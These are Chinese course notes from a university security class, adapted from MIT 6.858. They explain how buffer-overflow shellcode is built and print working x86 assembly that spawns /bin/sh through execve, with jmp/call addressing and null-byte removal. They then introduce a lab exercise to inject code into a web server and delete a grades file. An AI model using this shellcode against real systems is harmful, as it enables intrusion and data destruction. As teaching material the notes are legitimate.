#缓冲区溢出3：代码注入

###哈尔滨工业大学 网络与信息安全 张宇 2016

参考课程: [MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm) by Prof. Nickolai Zeldovich

实验资料: [MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。

参考资料：[Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html#article)

###Shell code原理

利用缓冲区溢出漏洞改写函数返回地址来劫持程序控制流，令其指向预执行代码。通常该代码会启动一个shell，称作"shell code"。下面是一个C语言程序启动shell的例子。

``` c
#include <stdio.h>void main() {   char *name[2];   name[0] = "/bin/sh";   name[1] = NULL;
   /* int execve(const char *filename, char *const argv[],
          char *const envp[]);   */   execve(name[0], name, NULL);
   exit(0);}
```

该程序中`execve()`在父进程中fork一个子进程，在子进程中调用`exec()`函数启动新的程序。`exec`系列函数中`execve()`为内核级系统调用。 `execve()`执行第一个参数`filename`字符串所指文件，第二个参数是利用数组指针来传递命令行参数，并且要以空指针`null`结束，最后一个参数则为传递给执行文件的新环境变量数组。Linux的`execve()`通过寄存器传递参数，由0x80软中断触发调用。调用过程如下：

1. 内存中存在`null`结尾字符串`"/bin/sh"`
1. 内存中存在`"/bin/sh"的地址`加一个`null long word`1. 拷贝`execve`调用号(`0xb`)到`eax`寄存器1. 拷贝`"/bin/sh"的地址的地址`到`ebx`寄存器1. 拷贝`"/bin/sh"的地址`到`ecx`寄存器1. 拷贝`null long word的地址`到`edx`寄存器1. 执行`int $0x80`指令

若`execve()`调用失败，程序将继续执行，很可能导致崩溃。为了令程序在调用失败后仍然可以正常退出，在`execve()`之后添加`exit()`系统调用：

1. 拷贝`exit`调用号(`0x1`)到`exa`寄存器
2. 拷贝`0x0`到`exb`寄存器
3. 执行`int $0x80`指令

在shell code中，多处需要用到地址，一个问题是我们不知道代码和字符串会被放置在哪里。解决该问题的一种方法是用`jmp`和`call`指令，通过`ip`指令指针相对寻址来跳到特定位置，而不需要事先知道准确地址。

首先，在通过改写返回地址来跳转到shell code后，利用`jmp`指令跳转到`call`指令。将`call`指令放在`"/bin/sh"`字符串之前，当执行`call`指令时，字符串地址将被入栈，作为`call`被执行时的返回地址。`call`指令只需简单的跳转到`jmp`之后的代码，执行`pop`指令将栈中的`call`的返回地址，即字符串地址，拷贝到一个寄存器使用。下面是程序描述与跳转示意图。

1. (1) 返回地址跳转到shell code
1. (2) `jmp`跳转到`call`
1. `pop`获得`"/bin/sh"地址`
1. 执行`execv()`
1. 执行`exit()`
1. (3) `call`跳转到`pop`
1. 字符串`"/bin/sh"`

```
low address         <———— stack growth ————        high address
                      
          +—————————(3)—————————+
          V                     | 
   [jmp][pop][execv()][exit()][call]["/bin/sh"][sfp][ret][arguments]
   ^  |                          ^                    |
   |  +—————————(2)——————————————+                    |
   +——————————————————————————————————(1)—————————————+  

```

通常shell code将被作为字符串注入缓冲区中。由于空字节(null)会被认为是字符串结尾，因此需要将其中的空字节去掉。一种主要手段是用`xorl %eax,%eax`指令来令`eax`寄存器为`0`，用`eax`作为参数，从而避免在参数中直接使用`0`。

在实验中提供了3个文件：

- `shellcode.S`：Shell code汇编代码
- `shellcode.bin`：`make`编译后二进制代码
- `run-shellcode`：直接运行`shellcode.bin`

查看`shellcode.S`：

``` gas
#include <sys/syscall.h>                /* 系统调用编号表 */

#define STRING  "/bin/sh"
#define STRLEN  7
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+4)

.globl main                             /* 令符号main对ld和其他程序可见 */
        .type   main, @function         /* 设置符号main的类型为函数 */

 main:
        jmp     calladdr                /* 跳转(2) 到 CALL */

 popladdr:
        popl    %esi                    /* STRING的地址出栈 */
        movl    %esi,(ARGV)(%esi)       /* set up argv pointer to pathname */
        xorl    %eax,%eax               /* 获得32-bit的0 */
        movb    %al,(STRLEN)(%esi)      /* 将0写入STRING结尾字节 */
        movl    %eax,(ENVP)(%esi)       /* 将envp置0 */

        movb    $SYS_execve,%al         /* syscall参数1: syscall编号 */
        movl    %esi,%ebx               /* syscall参数2: string pathname */
        leal    ARGV(%esi),%ecx         /* syscall arg 2: argv */
        leal    ENVP(%esi),%edx         /* syscall arg 3: envp */
        int     $0x80                   /* invoke syscall */

        xorl    %ebx,%ebx               /* syscall arg 2: 0 */
        movl    %ebx,%eax
        inc     %eax                    /* syscall arg 1: SYS_exit (1), uses */
                                        /* mov+inc to avoid null byte */
        int     $0x80                   /* invoke syscall */

 calladdr:
        call    popladdr
        .ascii  STRING                  /* 将字符串(不追加零)存入连续地址 */
```



###代码注入练习

在本练习中，利用缓冲区溢出漏洞将代码注入到web服务器，从而删除一个敏感文件`/home/httpd/grades.txt`。

以下文件用于本练习：




